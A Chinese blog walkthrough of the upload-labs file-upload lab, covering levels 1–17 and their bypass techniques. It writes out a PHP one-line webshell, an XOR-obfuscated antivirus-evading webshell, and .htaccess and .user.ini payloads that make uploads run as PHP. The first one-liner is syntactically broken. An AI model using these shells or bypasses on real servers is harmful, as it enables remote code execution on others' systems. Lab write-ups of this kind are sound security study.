---
title: upload-labs靶场通关
tags:
  - 靶场
  - upload-labs
date: 2023-03-26 16:05:26
categories: 靶场
keywords: upload-labs
description: 本文记录了作者在通关upload-labs靶场中面临的问题以及解决方案
top_img: https://pic.imgdb.cn/item/647c13aef024cca173275687.png
cover: https://pic.imgdb.cn/item/647c13adf024cca1732755e2.jpg
# password: xdxdsqyc15511551
# message: 暂未完成，仍在施工
---


## 准备工作

### 环境搭建

upload-labs的环境搭建有多种办法：

最简单的是直接下载作者 {% label c0ny1 %}提供的 [release](https://github.com/c0ny1/upload-labs/releases) 文件，但是因为博主电脑上还用 {% label phpStudy blue %}平台搭建了其他靶场，因此就选择使用Docker搭建的靶场。

然而在使用 Docker 搭建的过程中发现官方的 Docker 未正确配置，我选择了近期更新的 Docker 镜像：{% label monstertsl/upload-labs green %}

``` docker
docker pull monstertsl/upload-labs
```

### 上传脚本

首先准备一个一句话木马

```php
<?php eval[$_POST("peony")];?>
```

或者稍微做点混淆：

{% hideToggle 注释 %}

此处是基于 {% label AntSword blue %}中的插件———免杀 shell 自动生成的一句话木马文件，因为博主在自己电脑上写经典的一句话木马老是被Win10杀软自动删除，又懒得去调整，所以才使用了这个版本。

{% btn 'https://github.com/AntSwordProject/antSword', GitHub 传送门,fa-solid fa-download,outline purple %}

{% endhideToggle %}

```php
<?php 
class WEGT { 
    function Cnqq() {
        $BigR = "\xab" ^ "\xca";
        $bZum = "\xea" ^ "\x99";
        $rOPd = "\xf5" ^ "\x86";
        $dHQA = "\x2a" ^ "\x4f";
        $BIGj = "\xa8" ^ "\xda";
        $JyJj = "\xbc" ^ "\xc8";
        $gBmp =$BigR.$bZum.$rOPd.$dHQA.$BIGj.$JyJj;
        return $gBmp;
    }
    function __destruct(){
        $ckqe=$this->Cnqq();
        @$ckqe($this->MQ);
    }
}
$wegt = new WEGT();
@$wegt->MQ = isset($_GET['id'])?base64_decode($_POST['peony']):$_POST['peony'];
?>
```

或者最干脆的 `phpinfo()` 函数：

```php
<?php phpinfo();?>
```

## Pass-01

{% note primary %}
考察点： 前端校验
应用场景：只在客户端进行 JS 检查
{% endnote %}

前端代码如下：

![Pass-01前端代码](https://pic.imgdb.cn/item/647c139cf024cca1732736a7.png)

分析代码，首先是在前端以白名单的形式（ `.jpg|.png|.gif` ）检验进行对文件后缀检验，绕过方式一共有两种：

### 抓包绕过

抓包绕过比较简单，直接打开 {%label BurpSuite blue %}，将预先保存成图片格式（ `.jpg|.png|.gif` ）的文件名修改成 PHP 文件即可。

![Pass-01抓包结果01](https://pic.imgdb.cn/item/647c139cf024cca173273747.png)

修改之后发送请求，发现网页会再次请求上传的文件：

![Pass-01抓包结果02](https://pic.imgdb.cn/item/647c139df024cca1732738f2.png)

{% label AntSword %}链接试试：

![AntSword链接结果](https://pic.imgdb.cn/item/647c139ef024cca1732739d6.png)

这样就完成了最简单的前端绕过文件上传。

### 修改前端代码绕过

在这还有一种其他办法可以绕过前端绕过，那就是直接保存网页文件后修改前端代码。

![保存网页的方法](https://pic.imgdb.cn/item/647c139ef024cca1732739e7.png)

编辑器打开保存后的`html`文件，修改前端代码如下：

{% tabs Pass01-Code %}
<!-- tab Diff -->
``` diff
<!-- 原代码 -->
-   <form enctype="multipart/form-data"  method="post" onsubmit="return checkFile()"></form> -->
<!-- 现代码 -->
+   <form enctype="multipart/form-data" action="http://192.168.118.128/Pass-01/index.php" method="post" onsubmit="return checkFile()">
    <p>请选择要上传的图片：</p><p>
    <input class="input_file" type="file" name="upload_file">
    <input class="button" type="submit" name="submit" value="上传">
</p></form>

<!-- 中间省略 -->

<script type="text/javascript">
    function checkFile() {
        var file = document.getElementsByName('upload_file')[0].value;
        if (file == null || file == "") {
            alert("请选择要上传的文件!");
            return false;
        }
        //定义允许上传的文件类型
        
        //原js代码
-       var allow_ext = ".jpg|.png|.gif";
        
        //现js代码 
+       var allow_ext = ".jpg|.png|.gif|.php";        
        //提取上传文件的类型
        var ext_name = file.substring(file.lastIndexOf("."));
        //判断上传文件类型是否允许上传
        if (allow_ext.indexOf(ext_name) == -1) {
            var errMsg = "该文件不允许上传，请上传" + allow_ext + "类型的文件,当前文件类型为：" + ext_name;
            alert(errMsg);
            return false;
        }
    }
</javascript>
```
<!-- endtab -->

<!-- tab Completed -->

``` html
<form enctype="multipart/form-data" action="http://192.168.118.128/Pass-01/index.php" method="post" onsubmit="return checkFile()">
    <p>请选择要上传的图片：</p><p>
    <input class="input_file" type="file" name="upload_file">
    <input class="button" type="submit" name="submit" value="上传">
</p></form>

<!-- 中间省略 -->

<script type="text/javascript">
    function checkFile() {
        var file = document.getElementsByName('upload_file')[0].value;
        if (file == null || file == "") {
            alert("请选择要上传的文件!");
            return false;
        }
        //定义允许上传的文件类型
        var allow_ext = ".jpg|.png|.gif|.php";        
        //提取上传文件的类型
        var ext_name = file.substring(file.lastIndexOf("."));
        //判断上传文件类型是否允许上传
        if (allow_ext.indexOf(ext_name) == -1) {
            var errMsg = "该文件不允许上传，请上传" + allow_ext + "类型的文件,当前文件类型为：" + ext_name;
            alert(errMsg);
            return false;
        }
    }
</script>
```

<!-- endtab -->
{% endtabs %}

然后直接再用浏览器打开修改过的文件，直接提交 PHP 脚本即可。从下图可以看到，已经上传成功。

![phpinfo上传成功](https://pic.imgdb.cn/item/647c139ef024cca173273a4b.png)

## Pass-02

{% note primary %}
考察点：`MIME` 绕过
应用场景：只对 `MIME` 进行检查
{% endnote %}

### MIME 定义


{% blockquote MIME定义 %}
要想绕过 `MIME` ，就得先了解 `MIME` 是什么。



MIME通过在文件的头部添加一些元数据（例如文件类型和编码方式）来指示文件的类型和处理方式。这些元数据可以帮助接收者在不同的设备和软件上正确地打开、显示或处理文件。例如，MIME可以用于将图像文件、音频文件、视频文件、文档文件和其他类型的文件添加到电子邮件中，从而使邮件接收者可以轻松地查看和下载这些文件。

MIME也用于Web服务器上的文件传输，允许Web服务器将不同的文件类型正确地传输到Web浏览器。Web浏览器可以使用MIME类型来确定如何处理从Web服务器接收到的文件，例如在浏览器中显示图像或将文件下载到计算机上。
{% endblockquote %}

HTTP 头部的 `Content-Type` 字段的内容就是 `MIME` 类型。

所谓 `MIME` 绕过，就是因为服务器后端只检测了 `MIME` 头，因此把对应部分修改成符合要求的文件类型即可绕过。

### MIME 常见类型

以下是一些常见的 `MIME` 文件类型，以及它们对应的 `MIME` 类型和文件扩展名，但是这并非全部 `MIME` 类型：

| MIME类型                      | 文件扩展名  |
| ----------------------------- | :---------: |
| text/plain                    |    .txt     |
| text/html                     | .html; .htm |
| application/pdf               |    .pdf     |
| application/msword            |    .doc     |
| application/vnd.ms-excel      |    .xls     |
| application/vnd.ms-powerpoint |    .ppt     |
| image/jpeg                    | .jpg; .jpeg |
| image/gif                     |    .gif     |
| image/png                     |    .png     |
| audio/mpeg                    |    .mp3     |
| video/mpeg                    |    .mpeg    |
| video/mp4                     |    .mp4     |
| application/zip               |    .zip     |
| application/x-gzip            | .gzip; .gz  |

在题目中，只需要打开 {% label BurpSuite blue %}抓包，将 `Content-Type` 字段改为 `image/jpeg` 即可

![绕过MIME](https://pic.imgdb.cn/item/647c139ef024cca173273a6a.png)

## Pass-03

{% note primary %}
考察点： 不完全的黑名单
应用场景：特殊后缀名能够解析
{% endnote %}

此处的黑名单绕过比较简单，只是通过黑盒测试讲不清楚原理，因此此处贴出部分后端代码：

``` php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array('.asp','.aspx','.php','.jsp');
        $file_name = trim($_FILES['upload_file']['name']);
        //删除文件名末尾的点
        $file_name = deldot($file_name);
        //strrchr函数：搜索.在字符串中的位置，并返回从该位置到字符串结尾的所有字符
        //返回文件名
        $file_ext = strrchr($file_name, '.'); 
        //转换为小写
        $file_ext = strtolower($file_ext); 
        //去除字符串::$DATA
        $file_ext = str_ireplace('::$DATA', '', $file_ext);
        //trim函数：移除字符串两侧的空白字符或其他预定义字符
        //收尾去空
        $file_ext = trim($file_ext); 


        //当文件后缀名绕过检测时
        if(!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            //文件被重命名为 上传时间戳+1000-999随机数
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;            
            if (move_uploaded_file($temp_file,$img_path)) {
                 $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

分析代码逻辑，发现后端逻辑如下：

1. 掉文件名末尾的点；
2. 获取文件后缀名；
3. 将其文件后缀名转换为小写；
4. 去除字符串 `::$DATA` ；
5. 去除文件后缀名中首尾可能存在的空格；
6. 重命名文件。

{% hideToggle 关于 ::$DATA 的解释,green,white %}

`::$DATA` 是 `Windows` 操作系统中的一种特殊命名约定，用于表示 NTFS 文件系统中的数据流。

在 PHP 中，可以使用 `fopen()` 、`fread()` 和 `fwrite()` 等函数来读取和写入文件流，但是不能直接使用 `::$DATA` 来访问数据流。

在后文中还会详细介绍。

{% endhideToggle %}

通过审计源码/黑盒测试，发现只对 `'.asp','.aspx','.php','.jsp'` 四种文件类型做黑名单处理。因此可以通过不同php后缀文件（ `php3 ; php4 ; phtml` 等）来绕过检测。

抓包发现被修改后的文件名，访问成功：

![抓包结果](https://pic.imgdb.cn/item/647c139ef024cca173273b1b.png)

{% note danger %}
踩坑提示
{% endnote %}

不同php后缀文件（ `php3 ; php4 ; phtml` 等）需要在服务器能够解析的情况下才能应用（一般默认是无法解析的），因此现目前这个绕过方式相对来说比较鸡肋。

此前博主未在 {% label phpStudy blue %}中正确配置 `httpd.conf` 文件，因此请求上传的 PHP 脚本始终没有回显。

而只需要在 `httpd.conf` 文件添加解析代码

``` ini
AddType application/x-hppd-php .php .phtml .php4 .php3 .php2
```

## Pass-04

{% note primary %}
考察点：`htaccess` 绕过
应用场景：服务端允许 `.htaccess` 文件生效
{% endnote %}

分析本题的后端源码，发现除了文件后缀名黑名单增多之外，整体逻辑与前一题没有任何差别。因此绕过的思想还是寻找黑名单中没有但能达到目的的文件类型。

这里就要提到 `.htaccess` 文件了

{% blockquote ChatGPT https://chat.openai.com/ %}
`.htaccess` 文件是一种 Apache Web 服务器使用的配置文件，它通常用于在特定目录下设置 Web 服务器的配置选项和规则。它可以用于控制目录的访问权限、启用 URL 重写和重定向、设置自定义错误页面、设置缓存等等。通过修改 `.htaccess` 文件，您可以对特定目录的访问权限进行细粒度的控制，从而使您能够更好地保护您的网站和数据。
{% endblockquote %}

因此要想解答此题，只需要上传一个允许php文件解析的 `.htaccess` 文件即可：

``` ini
SetHandler application/x-httpd-php
```

{% note danger %}
踩坑提示（应用场景）
{% endnote %}

本题同样需要服务器能够解析 `.htaccess` 文件。

{% hideToggle 存疑的解决方式,orange, %}

需要在 `httpd.conf` 中，修改两处配置项：

 `Apache` 加载 `rewrite` 模块

``` ini
LoadModule rewrite_module modules/mod_rewrite.so
AllowOverride All（默认为None）
```

{% btn 'https://github.com/AntSwordProject/antSword', GitHub 传送门,fa-solid fa-download,outline purple %}

{% endhideToggle %}

## Pass-05

{% note primary %}
考察点：`.user.ini` 文件
应用场景：① 服务器脚本语言为 PHP；② 并且使用 CGI/FastCGI 模式；③ PHP 版本>5.3.0；④ 上传目录下要有可执行的 PHP 文件；
{% endnote %}

本题在黑名单中添加了 `.htaccess` 文件，因此第4题的做法无法在继续了。

![第五题提示](https://pic.imgdb.cn/item/647c139ef024cca173273b48.png)

通过提示我们知道，上传目录存在 `readme.php` 文件，访问文件发现只有一个静态的回显，那么应该如何利用这个文件呢？

这里又涉及到另外一种 Web 配置文件—— `ini` 文件：

{% blockquote 白垩之子 https://www.freebuf.com/articles/web/265245.html %}

`.user.ini` ，它会影响 `php.ini` 中的配置，从而将指定的文件内容按 php 来解析，影响的范围该文件所在的目录以及子目录。需要等待 `php.ini` 中的 `user_ini.cache_ttl` 设置的时间或重启 Apache 才能生效，且只在 `php5.3.0` 之后的版本才生效。`.user.ini` 比 `.htaccess` 用的更广，不管是 `nginx/Apache/IIS` ，只要是以 `Fastcgi` 运行的 php 都可以用这个办法。如果使用Apache，则用 `.htaccess` 文件有同样的效果。

{% endblockquote %}

此处只需要在 `.user.ini` 文件中写入

``` ini
auto_prepend_file=test3.jpg
```

然后上传事先准备的图片马 `test3.jpg` ，访问 `readme.php` 文件即可。

{% note danger %}
踩坑提示
{% endnote %}

没有把 `user_ini.cache_ttl` 设置的时间改为`300`，无论如何都不解析orz。

``` ini
;;;;;;;;;;;;;;;;;;;;
; php.ini Options  ;
;;;;;;;;;;;;;;;;;;;;
; Name for user-defined php.ini (.htaccess) files. Default is ".user.ini"
user_ini.filename = ".user.ini"

; To disable this feature set this option to empty value
;user_ini.filename =

; TTL for user-defined php.ini files (time-to-live) in seconds. Default is 300 seconds (5 minutes)
user_ini.cache_ttl = 300
```

## Pass-06

{% note primary %}
考察点：黑名单过滤不完全
应用场景：黑名单过滤规则不严谨，没有将后缀名转换为小写
{% endnote %}

如果是黑盒测试可能得看运气才能绕过，但是如果能够看到后端源码（白盒审计），就会发现本关并没有将文件后缀名小写（没有 `strtolower` 函数），直接通过文件后缀名大小写混写（ `test3.phP` ）即可绕过。

## Pass-07

{% note primary %}
考察点： Windows系统特性
应用场景：① 服务器搭建在Windows上；② 没有去除字符串收尾处的空白字符。
{% endnote %}

同上一题，只是将大小写混写变为了空格。为什么能够绕过呢？

因为Windows系统对于文件和文件名存在限制，空格字符放在结尾时，不符合操作系统的命名规范。因此在最后生成文件时，字符会被自动去除。

{% note danger %}
踩坑提示
{% endnote %}

此处利用的是Windows的特性，博主以为是Docker配置问题排查了一个多小时orz，因此又重新转回本机进行测试。

## Pass-08

{% note primary %}
考察点： Windows系统特性
应用场景：① 服务器搭建在Windows上；② 没有去除字符串收尾处的 `.` 点。
{% endnote %}

同上一题，` ` （空格）换成了 `.` （点）。与上一题的原理相同。

## Pass-09

{% note primary %}
考察点： Windows 系统特性
应用场景：① 服务器搭建在 Windows 上；② 没有去除字符串收尾处的 `::$DATA` 。
{% endnote %}

同上一题，`.` （点）换成了 `::$DATA` 。

这一关涉及到 NTFS 文件流特性。

## Pass-10

{% note primary %}
考察点：逻辑绕过
应用场景：文件名上传者可控
{% endnote %}

对后端源码进行审计，发现本题代码与前面题目的区别：

{% tabs Pass10-Code %}
<!-- tab Pass03 -->
``` php
        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件类型不允许上传！';
        }        
```
<!-- endtab -->
<!-- tab Pass10 -->
``` php
        if(!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;            
            if (move_uploaded_file($temp_file,$img_path)) {
                 $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！';
        }        
```
<!-- endtab -->
{% endtabs %}

仔细对比两关代码，发现本体代码除了没有对上传文件进行重命名以外，更是直接复制上传文件原命名进行使用，因此可以针对性构建逻辑绕过的 `payload` ，也就是将 `test.php` 文件改为 `test.php. .` ，从而绕过上传检测。

## Pass-11

{% note primary %}
考察点：双写绕过
应用场景：黑名单只是简单替换为空
{% endnote %}

分析后端源码：

``` php
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array("php","php5","php4","php3","php2","html","htm","phtml","pht","jsp","jspa","jspx","jsw","jsv","jspf","jtml","asp","aspx","asa","asax","asOcx","ashx","asmx","cer","swf","htaccess","ini");

        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = str_ireplace($deny_ext,"", $file_name);
        $temp_file = $_FILES['upload_file']['tmp_name'];
        $img_path = UPLOAD_PATH.'/'.$file_name;        
        if (move_uploaded_file($temp_file, $img_path)) {
            $is_upload = true;
        } else {
            $msg = '上传出错！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
```

发现只是将黑名单替换为了空，因此可以将文件后缀名双写（ `test.pphphp` ）来进行绕过，这样在替换为空之后，文件后缀名就变为了 `test.php`

## Pass-12

{% note primary %}
考察点：Get 型 `%00` 绕过
应用场景：① PHP 版本 < 5.3.4 ; `php.ini` 配置文件中 `magic_quotes_gpc=Off` ；
{% endnote %}

本题是白名单了，只允许

{% note danger %}
踩坑提示
{% endnote %}

注意php版本问题，我始终没有绕过orz

## Pass-13

{% note primary %}
考察点：Post 型 `%00` 绕过
应用场景：① PHP 版本 < 5.3.4 ; `php.ini` 配置文件中 `magic_quotes_gpc=Off` ；
{% endnote %}

{% note danger %}
踩坑提示
{% endnote %}

注意 PHP 版本问题，我始终没有绕过orz

## Pass-14

{% note primary %}
考察点：文件头检测
应用场景：①文件格式仅根据文件头判断；②存在文件包含漏洞
{% endnote %}

分析后端代码：

``` php
function getReailFileType($filename){
    $file = fopen($filename, "rb");
    $bin = fread($file, 2); //只读2字节
    fclose($file);
    $strInfo = @unpack("C2chars", $bin);    
    $typeCode = intval($strInfo['chars1'].$strInfo['chars2']);    
    $fileType = '';    
    switch($typeCode){      
        case 255216:            
            $fileType = 'jpg';
            break;
        case 13780:            
            $fileType = 'png';
            break;        
        case 7173:            
            $fileType = 'gif';
            break;
        default:            
            $fileType = 'unknown';
        }    
        return $fileType;
}
```

`getReailFileType($filename)` 的功能是根据一个文件名 `$filename` 来获取文件的真实类型，而不是根据文件的扩展名。它首先用 `fopen()` 函数打开文件，然后用 `fread()` 函数读取文件的前两个字节，这两个字节通常包含了文件类型的标识符。然后用 `fclose()` 函数关闭文件，用 `unpack()` 函数将二进制数据转换为数组，用 `intval()` 函数将数组中的两个元素拼接成一个整数，这个整数就是 `$typeCode` 变量。接下来就是用 switch 语句判断 `$typeCode` 的值，根据变量 `$typeCode` 的值来判断一个文件的类型是 jpg ，png ，gif 还是未知的，并返回 `$fileType` 变量。

因此上传具有正常文件头的图片马即可。

gif 的文件头为 `GIF89a` （字符串）；png 的文件头为 `0x89504E47` ；jpg 的文件头为 `0xFFD8FF` 。

Burp 抓包修改图片马文件头：

![抓包修改结果](https://pic.imgdb.cn/item/647c13a5f024cca173274634.png)

在 Reponse 中搜索 jpg 查找到图片地址，通过文件包含漏洞请求图片马

![图片马回显](https://pic.imgdb.cn/item/647c13a5f024cca17327465a.png)

## Pass-15

{% note primary %}
考察点：文件头检测
应用场景：①通过 `getimagesize()` 函数判断文件类型；②存在文件包含漏洞
{% endnote %}

分析后端代码：

``` php
function isImage($filename){
    $types = '.jpeg|.png|.gif';
    if(file_exists($filename)){
        $info = getimagesize($filename);
        $ext = image_type_to_extension($info[2]);
        if(stripos($types,$ext)>=0){
            return $ext;
        }else{
            return false;
        }
    }else{
        return false;
    }
}
```

`isImage($filename)` 函数的功能是根据一个文件名 `$filename` 来判断一个文件是否是图片，如果是，就返回图片的扩展名，如果不是，就返回 false 。具体的逻辑如下：

1. 首先定义了一个变量 `$types` ，它是一个字符串，包含了三种图片格式的扩展名：.jpeg ，.png 和.gif 。
2. 然后用 `file_exists()` 函数检查 `$filename` 是否存在，如果存在，就用 `getimagesize()` 函数获取文件的图像信息，这个函数会返回一个数组，其中第三个元素为图像类型。
3. 接着用 `image_type_to_extension()` 函数将图像类型转换为对应的扩展名，并赋值给 `$ext` 变量。
4. 接下来用 `stripos()` 函数在 `$types` 字符串中查找 `$ext` 是否存在，如果存在，就表示文件是图片，就返回 `$ext` 变量，如果不存在，就表示文件不是图片，就返回 false 。此外，如果文件不存在，也直接返回 false 。

分析上述逻辑，可以看出关键点在于 `getimagesize()` 和 `image_type_to_extension()` 函数上，查阅 PHP 手册：

{% blockquote PHP Manual https://www.php.net/manual/en/function.getimagesize.php %}
- getimagesize()
  确定任何支持的指定图像文件的大小，并返回尺寸以及文件类型和 height/width 文本字符串，以在标准 HTML IMG 标签和对应的 HTTP 内容类型中使用。

- image_type_to_extension()
  根据指定的图像类型返回对应的后缀名， 或者在失败时返回 false。

  {% endblockquote %}

`getimagesize()` 函数是 PHP 语言的一个内置函数，它的功能是获取一个图像文件的大小和类型。这个函数接受一个文件名作为参数，并返回一个数组，包含了图像的宽度，高度，类型，属性，位数和MIME类型。这个函数还可以接受一个可选的参数 `$image_info` ，用于提取图像文件中的一些扩展信息，例如 JPG 的 APP 标记。这个函数可以用于在 HTML 中生成正确的 IMG 标签或者判断图像文件的格式。**`getimagesize()` 函数也是通过文件头来判断文件类型的。**
`image_type_to_extension()` 函数也是 PHP 语言的一个内置函数，它的功能是根据一个图像类型的常量 `IMAGETYPE_XXX` 来获取对应的文件后缀。这个函数接受两个参数，第一个参数是图像类型的常量，例如IMAGETYPE_PNG，第二个参数是一个布尔值，表示是否在后缀前加一个点，默认是 true 。这个函数返回一个字符串，表示图像类型的后缀，例如" .png "或者" .jpg "。如果图像类型不合法，就返回 false 。这个函数可以用于生成正确的文件名或者 MIME 类型。

综上，绕过方法与14关相同，同样通过修改文件头即可绕过检测：

![上传成功](https://pic.imgdb.cn/item/647c13a6f024cca1732747ad.png)

![请求图片马](https://pic.imgdb.cn/item/647c13a6f024cca1732747c3.png)

## Pass-16

{% note primary %}
考察点：文件头检测
应用场景：①通过 `exif_imagetype()` 函数判断文件类型；②存在文件包含漏洞；③开启 `php_exif` 模块。
{% endnote %}

分析后端源码：

``` php
function isImage($filename){
    //需要开启php_exif模块
    $image_type = exif_imagetype($filename);
    switch ($image_type) {
        case IMAGETYPE_GIF:
            return "gif";
            break;
        case IMAGETYPE_JPEG:
            return "jpg";
            break;
        case IMAGETYPE_PNG:
            return "png";
            break;    
        default:
            return false;
            break;
    }
}
```

`isImage()` 函数使用了 `exif_imagetype()` 函数来获取文件的图像类型，它可以读取一个图像的**第一个字节**并检查其签名，如果发现恰当的签名返回一个对应的常量，否则返回false。然后它用 switch 语句来根据图像类型的常量 `IMAGETYPE_XXX` 来返回对应的扩展名。如果图像类型不是 GIF ，JPEG 或 PNG 中的一种，就返回 false 。

绕过方法同前两关，修改文件头即可：

![上传结果](https://pic.imgdb.cn/item/647c13a6f024cca1732748ae.png)

![请求图片马](https://pic.imgdb.cn/item/647c13a7f024cca1732749dc.png)

{% note danger %}
踩坑提示
{% endnote %}

这个函数需要开启 `php_exif` 模块

## Pass-17

{% note primary %}
考察点：二次渲染绕过
应用场景：①通过 `exif_imagetype()` 函数判断文件类型；②存在文件包含漏洞；③开启 `php_exif` 模块。
{% endnote %}

后端源码分析：

``` php
if(move_uploaded_file($tmpname,$target_path)){
    //使用上传的图片生成新的图片
    $im = imagecreatefromjpeg($target_path);

    if($im == false){
        $msg = "该文件不是jpg格式的图片！";
        @unlink($target_path);
    }else{
        //给新图片指定文件名
        srand(time());
        $newfilename = strval(rand()).".jpg";
        //显示二次渲染后的图片（使用用户上传图片生成的新图片）
        $img_path = UPLOAD_PATH.'/'.$newfilename;
        imagejpeg($im,$img_path);
        @unlink($target_path);
        $is_upload = true;
        }
} else {
    $msg = "上传出错！";
}
```

这段代码的功能是检测上传的图片是否为 jpg 格式，并对其进行二次渲染，生成一个新的图片。代码的逻辑是：

- 使用 `move_uploaded_file()` 函数将临时文件移动到目标路径。
- 使用 `imagecreatefromjpeg()` 函数从目标路径创建一个图像资源。
- 如果图像资源为 false ，说明文件不是 jpg 格式的图片，输出错误信息，并删除目标路径的文件。
- 如果图像资源不为 false ，说明文件是 jpg 格式的图片，使用随机数生成一个新的文件名，并使用 `imagejpeg()` 函数将图像资源保存为新的图片。
- 删除目标路径的文件，并将上传状态设为 true 。

GIF 或者 png 格式同理。

<!-- ## Pass-18

{% note primary %}
考察点：文件头检测
应用场景：①通过 `exif_imagetype()` 函数判断文件类型；②存在文件包含漏洞；③开启 `php_exif` 模块。
{% endnote %}

## Pass-19

{% note primary %}
考察点：文件头检测
应用场景：①通过 `exif_imagetype()` 函数判断文件类型；②存在文件包含漏洞；③开启 `php_exif` 模块。
{% endnote %}

## Pass-20

{% note primary %}
考察点：文件头检测
应用场景：①通过 `exif_imagetype()` 函数判断文件类型；②存在文件包含漏洞；③开启 `php_exif` 模块。
{% endnote %}

## Pass-21

{% note primary %}
考察点：文件头检测
应用场景：①通过 `exif_imagetype()` 函数判断文件类型；②存在文件包含漏洞；③开启 `php_exif` 模块。
{% endnote %} -->